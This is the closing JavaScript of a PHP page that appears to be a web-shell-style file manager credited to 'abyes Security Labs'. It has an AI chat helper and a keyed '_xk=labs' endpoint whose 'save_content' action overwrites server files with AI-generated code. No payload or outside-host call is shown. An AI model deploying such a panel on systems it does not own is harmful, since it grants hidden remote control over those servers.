        '<div style="font-size:10.5px;color:var(--text-muted);margin-top:1px;">Sedang dalam pengembangan oleh abyes Security Labs</div>',
        '</div>',
    ].join('');

    document.body.appendChild(toast);
    setTimeout(function() {
        toast.style.transition = 'opacity .3s ease, transform .3s ease';
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(-50%) translateY(8px)';
        setTimeout(function() { if (toast.parentNode) toast.remove(); }, 320);
    }, 3000);
}

function nmRenderMarkdown(text) {
    if (!text) return '';

    var escaped = text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');

    escaped = escaped.replace(/```(\w*)\n?([\s\S]*?)```/g, function(_, lang, code) {
        var langLabel = lang ? '<span style="font-size:9px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;font-family:\'Inter\',sans-serif;margin-bottom:4px;display:block;">' + lang + '</span>' : '';
        return '<div style="background:#050710;border:1px solid rgba(99,102,241,0.2);border-radius:6px;padding:12px;margin:8px 0;overflow-x:auto;">'
            + langLabel
            + '<code style="font-family:\'JetBrains Mono\',monospace;font-size:11.5px;color:#a6e3a1;white-space:pre;display:block;line-height:1.65;">' + code.trim() + '</code>'
            + '</div>';
    });

    escaped = escaped.replace(/`([^`]+)`/g, '<code style="background:rgba(99,102,241,0.12);border:1px solid rgba(99,102,241,0.2);border-radius:3px;padding:1px 5px;font-family:\'JetBrains Mono\',monospace;font-size:11px;color:#c4b5fd;">$1</code>');

    escaped = escaped.replace(/\*\*(.+?)\*\*/g, '<strong style="color:#e2e8f0;font-weight:600;">$1</strong>');

    escaped = escaped.replace(/\*(.+?)\*/g, '<em style="color:#cbd5e1;">$1</em>');

    escaped = escaped.replace(/^---$/gm, '<hr style="border:none;border-top:1px solid var(--border-soft);margin:10px 0;">');

    escaped = escaped.replace(/^### (.+)$/gm, '<div style="font-size:13px;font-weight:700;color:var(--accent);margin:10px 0 4px;">$1</div>');
    escaped = escaped.replace(/^## (.+)$/gm, '<div style="font-size:14px;font-weight:700;color:#e2e8f0;margin:10px 0 4px;">$1</div>');
    escaped = escaped.replace(/^# (.+)$/gm, '<div style="font-size:15px;font-weight:700;color:#e2e8f0;margin:10px 0 5px;">$1</div>');

    escaped = escaped.replace(/^(\d+)\. (.+)$/gm, '<div style="padding-left:14px;margin:2px 0;display:flex;gap:6px;"><span style="color:var(--accent);font-weight:600;min-width:16px;">$1.</span><span>$2</span></div>');

    escaped = escaped.replace(/^[-*] (.+)$/gm, '<div style="padding-left:14px;margin:2px 0;display:flex;gap:6px;"><span style="color:var(--accent);font-weight:700;min-width:10px;">•</span><span>$1</span></div>');

    escaped = escaped.replace(/\n\n/g, '<br><br>');

    escaped = escaped.replace(/\n/g, '<br>');

    return escaped;
}

var askAiLoading = false;

function showAskAiModal(filePath, fileName) {
    document.getElementById('askAiFilePath').value = filePath;
    document.getElementById('askAiLastCode').value = '';
    document.getElementById('askAiFileName').textContent = fileName;
    document.getElementById('askAiMessages').innerHTML = '';
    document.getElementById('askAiResponseWrap').style.display = 'none';
    document.getElementById('askAiResponseBox').innerHTML = '';
    document.getElementById('askAiEditBtn').style.display = 'none';
    document.getElementById('askAiTyping').style.display = 'none';
    document.getElementById('askAiInput').value = '';
    document.getElementById('askAiInput').style.height = 'auto';
    document.getElementById('askAiQuickPrompts').style.display = 'flex';
    document.getElementById('askAiModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('askAiInput').focus(); }, 80);
}

function askAiSend(preset) {
    if (askAiLoading) return;
    var input    = document.getElementById('askAiInput');
    var filePath = document.getElementById('askAiFilePath').value;
    var q        = preset || input.value.trim();
    if (!q) return;

    var msgs = document.getElementById('askAiMessages');
    var userBubble = document.createElement('div');
    userBubble.style.cssText = 'display:flex;justify-content:flex-end;';
    userBubble.innerHTML = '<div style="background:var(--accent);border-radius:12px 4px 12px 12px;padding:9px 13px;font-size:12.5px;color:#fff;line-height:1.55;max-width:80%;word-break:break-word;">' + q.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</div>';
    msgs.appendChild(userBubble);
    msgs.scrollTop = msgs.scrollHeight;

    if (!preset) { input.value = ''; input.style.height = 'auto'; }
    document.getElementById('askAiQuickPrompts').style.display = 'none';
    document.getElementById('askAiResponseWrap').style.display = 'none';

    var typingEl = document.getElementById('askAiTyping');
    typingEl.style.display = 'flex';
    msgs.scrollTop = msgs.scrollHeight;

    var btn = document.getElementById('askAiSendBtn');
    askAiLoading = true;
    btn.disabled = true; btn.style.opacity = '0.5';

    var fd = new FormData();
    fd.append('_xmod', '1');
    fd.append('_xk', 'labs');
    fd.append('q', q);
    if (filePath) fd.append('file_path', filePath);

    fetch(window.location.href.split('?')[0] + '?_xk=labs', {
        method: 'POST', body: fd
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
        typingEl.style.display = 'none';
        var msg = '';
        if (data && data.response && data.response.data && data.response.data.message) {
            msg = data.response.data.message;
        } else if (data && data.err) {
            msg = 'Error: ' + data.err;
        } else {
            msg = 'Respons tidak valid dari AI.';
        }

        var box = document.getElementById('askAiResponseBox');
        box.innerHTML = nmRenderMarkdown(msg);
        document.getElementById('askAiResponseWrap').style.display = 'block';

        var botBubble = document.createElement('div');
        botBubble.style.cssText = 'display:flex;gap:8px;align-items:flex-start;';
        botBubble.innerHTML = '<div style="width:22px;height:22px;border-radius:50%;background:linear-gradient(135deg,#a78bfa,#6366f1);flex-shrink:0;display:flex;align-items:center;justify-content:center;margin-top:2px;"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></div>'
            + '<div style="background:rgba(167,139,250,0.1);border:1px solid rgba(167,139,250,0.2);border-radius:4px 12px 12px 12px;padding:9px 12px;font-size:12.5px;color:var(--text);line-height:1.6;max-width:80%;word-break:break-word;">'
            + nmRenderMarkdown(msg)
            + '</div>';
        msgs.appendChild(botBubble);
        msgs.scrollTop = msgs.scrollHeight;

        var codeMatch = msg.match(/```[\w]*\n?([\s\S]*?)```/);
        if (codeMatch && filePath) {
            document.getElementById('askAiLastCode').value = codeMatch[1].trim();
            document.getElementById('askAiEditBtn').style.display = 'inline-flex';
        }
    })
    .catch(function() {
        typingEl.style.display = 'none';
        var errBubble = document.createElement('div');
        errBubble.style.cssText = 'color:var(--red);font-size:12px;padding:6px 10px;background:var(--red-muted);border-radius:6px;border:1px solid rgba(239,68,68,0.25);';
        errBubble.textContent = 'Gagal terhubung ke AI API.';
        document.getElementById('askAiMessages').appendChild(errBubble);
    })
    .finally(function() {
        askAiLoading = false;
        btn.disabled = false; btn.style.opacity = '1';
    });
}

function fileActionRequest(params, cb) {
    var fd = new FormData();
    fd.append('_xk', 'labs');
    Object.keys(params).forEach(function(k) { fd.append(k, params[k]); });
    var selfUrl = window.location.href.split('?')[0] + '?_xk=labs';
    fetch(selfUrl, { method: 'POST', body: fd })
        .then(function(r) { return r.json(); })
        .then(function(data) { cb(data); })
        .catch(function(e) { cb({err: 'Network error: ' + e.message}); });
}

function askAiApplyEdit() {
    var code     = document.getElementById('askAiLastCode').value;
    var filePath = document.getElementById('askAiFilePath').value;
    if (!code || !filePath) return;
    if (!confirm('Terapkan hasil AI ke file "' + document.getElementById('askAiFileName').textContent + '"? Isi file akan diganti dengan kode dari AI.')) return;

    var fd = new FormData();
    fd.append('_xk', 'labs');
    fd.append('file_action', 'save_content');
    fd.append('file_path', filePath);
    fd.append('new_content', code);

    fileActionRequest({ file_action: 'save_content', file_path: filePath, new_content: code }, function(r) {
        if (r.ok) {
            showToast('File berhasil diedit oleh AI!', 'success', 3500);
            hideModal2('askAiModal');
            location.reload();
        } else {
            showToast('Gagal menyimpan: ' + (r.err || 'Unknown error'), 'error', 4000);
        }
    });
}

var nowmeeOpen = false;
var nowmeeLoading = false;

function nowmeeToggle() {
    var panel = document.getElementById('nowmeePanel');
    var unread = document.getElementById('nowmeeUnread');
    nowmeeOpen = !nowmeeOpen;
    panel.style.display = nowmeeOpen ? 'flex' : 'none';
    if (nowmeeOpen) {
        unread.style.display = 'none';
        setTimeout(function() {
            document.getElementById('nowmeeInput').focus();
        }, 80);
    }
}

function nowmeeClearChat() {
    var box = document.getElementById('nowmeeMessages');
    box.innerHTML = '<div class="nm-msg nm-bot" style="display:flex;gap:8px;align-items:flex-start;">'
        + '<div style="width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,#6366f1,#22d3ee);flex-shrink:0;display:flex;align-items:center;justify-content:center;">'
        + '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><path d="M12 2a2 2 0 0 1 2 2c0 .74-.4 1.39-1 1.73V7h1a7 7 0 0 1 7 7h1a1 1 0 0 1 0 2h-1v1a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-1H2a1 1 0 0 1 0-2h1a7 7 0 0 1 7-7h1V5.73A2 2 0 0 1 10 4a2 2 0 0 1 2-2z"/></svg>'
        + '</div>'
        + '<div style="background:rgba(99,102,241,0.1);border:1px solid rgba(99,102,241,0.2);border-radius:4px 12px 12px 12px;padding:9px 12px;font-size:12.5px;color:var(--text);line-height:1.55;max-width:260px;">'
        + 'Chat dibersihkan. Ada yang bisa saya bantu?'
        + '</div></div>';
    document.getElementById('nowmeeSuggests').style.display = 'flex';
}

function nowmeeAppendMsg(text, isBot) {
    var box   = document.getElementById('nowmeeMessages');
    var wrap  = document.createElement('div');
    wrap.style.cssText = 'display:flex;gap:8px;align-items:flex-start;' + (isBot ? '' : 'flex-direction:row-reverse;');

    if (isBot) {
        var avatar = document.createElement('div');
        avatar.style.cssText = 'width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,#6366f1,#22d3ee);flex-shrink:0;display:flex;align-items:center;justify-content:center;';
        avatar.innerHTML = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><path d="M12 2a2 2 0 0 1 2 2c0 .74-.4 1.39-1 1.73V7h1a7 7 0 0 1 7 7h1a1 1 0 0 1 0 2h-1v1a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-1H2a1 1 0 0 1 0-2h1a7 7 0 0 1 7-7h1V5.73A2 2 0 0 1 10 4a2 2 0 0 1 2-2z"/></svg>';
        wrap.appendChild(avatar);
    }

    var bubble = document.createElement('div');
    if (isBot) {
        bubble.style.cssText = 'background:rgba(99,102,241,0.1);border:1px solid rgba(99,102,241,0.2);border-radius:4px 12px 12px 12px;padding:9px 12px;font-size:12.5px;color:var(--text);line-height:1.6;max-width:260px;word-break:break-word;';
    } else {
        bubble.style.cssText = 'background:var(--accent);border-radius:12px 4px 12px 12px;padding:9px 12px;font-size:12.5px;color:#fff;line-height:1.6;max-width:260px;word-break:break-word;';
    }
    if (isBot) {
        bubble.innerHTML = nmRenderMarkdown(text);
    } else {
        bubble.textContent = text;
    }
    wrap.appendChild(bubble);
    box.appendChild(wrap);
    box.scrollTop = box.scrollHeight;
    return bubble;
}

function nowmeeAppendTyping() {
    var box  = document.getElementById('nowmeeMessages');
    var wrap = document.createElement('div');
    wrap.id  = 'nmTypingWrap';
    wrap.style.cssText = 'display:flex;gap:8px;align-items:flex-start;';
    var avatar = document.createElement('div');
    avatar.style.cssText = 'width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,#6366f1,#22d3ee);flex-shrink:0;display:flex;align-items:center;justify-content:center;';
    avatar.innerHTML = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5"><path d="M12 2a2 2 0 0 1 2 2c0 .74-.4 1.39-1 1.73V7h1a7 7 0 0 1 7 7h1a1 1 0 0 1 0 2h-1v1a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-1H2a1 1 0 0 1 0-2h1a7 7 0 0 1 7-7h1V5.73A2 2 0 0 1 10 4a2 2 0 0 1 2-2z"/></svg>';
    var typing = document.createElement('div');
    typing.className = 'nm-typing';
    typing.style.cssText = 'background:rgba(99,102,241,0.1);border:1px solid rgba(99,102,241,0.2);border-radius:4px 12px 12px 12px;padding:11px 14px;display:flex;align-items:center;gap:2px;';
    typing.innerHTML = '<span></span><span></span><span></span>';
    wrap.appendChild(avatar);
    wrap.appendChild(typing);
    box.appendChild(wrap);
    box.scrollTop = box.scrollHeight;
}

function nowmeeRemoveTyping() {
    var el = document.getElementById('nmTypingWrap');
    if (el) el.remove();
}

function nowmeeSend(preset) {
    if (nowmeeLoading) return;
    var input = document.getElementById('nowmeeInput');
    var q = preset ? preset : input.value.trim();
    if (!q) return;

    document.getElementById('nowmeeSuggests').style.display = 'none';

    nowmeeAppendMsg(q, false);
    if (!preset) { input.value = ''; input.style.height = 'auto'; }

    var btn = document.getElementById('nowmeeSendBtn');
    nowmeeLoading = true;
    btn.disabled  = true;
    btn.style.opacity = '0.5';

    nowmeeAppendTyping();

    var formData = new FormData();
    formData.append('_xmod', '1');
    formData.append('q', q);
    formData.append('_xk', 'labs');

    fetch(window.location.href.split('?')[0] + '?_xk=labs', {
        method: 'POST',
        body: formData
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
        nowmeeRemoveTyping();
        var msg = '';
        if (data && data.response && data.response.data && data.response.data.message) {
            msg = data.response.data.message;
        } else if (data && data.err) {
            msg = 'Error: ' + data.err;
        } else {
            msg = 'Maaf, respons tidak valid dari server.';
        }
        nowmeeAppendMsg(msg, true);

        if (!nowmeeOpen) {
            document.getElementById('nowmeeUnread').style.display = 'block';
        }
    })
    .catch(function(err) {
        nowmeeRemoveTyping();
        nowmeeAppendMsg('Koneksi gagal. Pastikan server API aktif.', true);
    })
    .finally(function() {
        nowmeeLoading = false;
        btn.disabled  = false;
        btn.style.opacity = '1';
        var box = document.getElementById('nowmeeMessages');
        box.scrollTop = box.scrollHeight;
    });
}

(function() {
    if ('ontouchstart' in window || navigator.maxTouchPoints > 0) return;

    var ring = document.createElement('div');
    ring.id = 'cursorRing';

    var dot = document.createElement('div');
    dot.id = 'cursorDot';

    document.body.appendChild(ring);
    document.body.appendChild(dot);

    var s = document.createElement('style');
    s.textContent = [
        '*, *::before, *::after { cursor: none !important; }',
        '#cursorRing {',
        '  position: fixed; top: 0; left: 0; z-index: 999999;',
        '  width: 32px; height: 32px;',
        '  border: 1.5px solid rgba(99,102,241,0.75);',
        '  border-radius: 50%;',
        '  pointer-events: none;',
        '  transform: translate(-50%, -50%);',
        '  transition: width .25s ease, height .25s ease, border-color .25s ease, opacity .25s ease, background .2s ease;',
        '  will-change: transform;',
        '}',
        '#cursorDot {',
        '  position: fixed; top: 0; left: 0; z-index: 999999;',
        '  width: 5px; height: 5px;',
        '  background: #6366f1;',
        '  border-radius: 50%;',
        '  pointer-events: none;',
        '  transform: translate(-50%, -50%);',
        '  transition: width .1s ease, height .1s ease, background .15s ease;',
        '  will-change: transform;',
        '  box-shadow: 0 0 8px 2px rgba(99,102,241,0.55);',
        '}',
        '#cursorRing.is-hover {',
        '  width: 46px; height: 46px;',
        '  border-color: rgba(34,211,238,0.7);',
        '  background: rgba(34,211,238,0.07);',
        '}',
        '#cursorDot.is-hover {',
        '  width: 4px; height: 4px;',
        '  background: #22d3ee;',
        '  box-shadow: 0 0 10px 3px rgba(34,211,238,0.6);',
        '}',
        '#cursorRing.is-click {',
        '  width: 22px; height: 22px;',
        '  border-color: rgba(245,158,11,0.9);',
        '  background: rgba(245,158,11,0.12);',
        '  transition: width .08s ease, height .08s ease, border-color .08s ease, background .08s ease;',
        '}',
        '#cursorDot.is-click {',
        '  width: 7px; height: 7px;',
        '  background: #f59e0b;',
        '  box-shadow: 0 0 12px 4px rgba(245,158,11,0.7);',
        '}',
        'input, textarea, select { cursor: text !important; }',
    ].join('\n');
    document.head.appendChild(s);

    var mouseX = window.innerWidth / 2;
    var mouseY = window.innerHeight / 2;
    var ringX  = mouseX;
    var ringY  = mouseY;

    document.addEventListener('mousemove', function(e) {
        mouseX = e.clientX;
        mouseY = e.clientY;
        dot.style.left = mouseX + 'px';
        dot.style.top  = mouseY + 'px';
    });

    function lerp(a, b, t) { return a + (b - a) * t; }

    (function animate() {
        ringX = lerp(ringX, mouseX, 0.14);
        ringY = lerp(ringY, mouseY, 0.14);
        ring.style.left = ringX + 'px';
        ring.style.top  = ringY + 'px';
        requestAnimationFrame(animate);
    })();

    var interactors = 'a, button, label, input[type="checkbox"], input[type="radio"], input[type="submit"], input[type="button"], .btn, .upload-label, .mob-action-btn, .file-table tbody tr, .breadcrumb a, .sortlink';

    document.addEventListener('mouseover', function(e) {
        var t = e.target;
        if (t && (t.matches && t.matches(interactors) || t.closest && t.closest(interactors))) {
            ring.classList.add('is-hover');
            dot.classList.add('is-hover');
        }
    });

    document.addEventListener('mouseout', function(e) {
        var t = e.target;
        if (t && (t.matches && t.matches(interactors) || t.closest && t.closest(interactors))) {
            ring.classList.remove('is-hover');
            dot.classList.remove('is-hover');
        }
    });

    document.addEventListener('mousedown', function() {
        ring.classList.add('is-click');
        dot.classList.add('is-click');
    });
    document.addEventListener('mouseup', function() {
        ring.classList.remove('is-click');
        dot.classList.remove('is-click');
    });

    document.addEventListener('mouseleave', function() {
        ring.style.opacity = '0';
        dot.style.opacity  = '0';
    });
    document.addEventListener('mouseenter', function() {
        ring.style.opacity = '1';
        dot.style.opacity  = '1';
    });
})();
</script>

<?php endif; ?>
</body>
</html>
